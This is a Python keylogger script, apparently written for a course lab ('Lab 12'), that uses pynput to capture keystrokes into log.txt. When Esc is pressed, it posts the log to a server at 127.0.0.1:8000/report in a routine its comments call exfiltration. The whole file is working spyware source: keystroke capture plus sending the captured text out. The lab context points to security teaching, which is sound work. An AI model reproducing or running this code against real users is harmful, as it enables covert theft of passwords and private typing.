import requests
from typing import List
from pynput.keyboard import Key, Listener

# Global variables
char_count = 0
saved_keys = []

def send_to_server():
    """Sends the local log file content to the Lab 12 API server."""
    print("\nAttempting to exfiltrate logs...")
    try:
        with open("log.txt", "r") as f:
            data = f.read()
        # This points to my Lab 12 server running on localhost
        response = requests.post("http://127.0.0.1:8000/report", data={"content": data})
        print(f"Server response: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Exfiltration failed: {e}")

def write_to_file(keys: List[str]):
    """Writes keystrokes to log.txt."""
    with open("log.txt", "a") as file:
        for key in keys:
            key = str(key).replace("'", "")
            if "key".upper() not in key.upper():
                file.write(key)
        file.write("\n")

def on_key_press(key):
    try:
        print("Key Pressed: ", key)
    except Exception as ex:
        print("Error recording press: ", ex)

def on_key_release(key):
    global saved_keys, char_count

    if key == Key.esc:
        # User signaled stop: trigger exfiltration before exiting
        send_to_server()
        return False 
    
    else:
        if key == Key.enter:
            write_to_file(saved_keys)
            char_count = 0
            saved_keys = []
        elif key == Key.space:
            key = " "
            write_to_file(saved_keys)
            saved_keys = []
            char_count = 0

        saved_keys.append(key)
        char_count += 1

# Main Listener
with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    print("Start key logging...")
    # Change timeout to 60 for testing, or 30*60 for the full lab
    listener.join(timeout=60) 
    print("End key logging...")
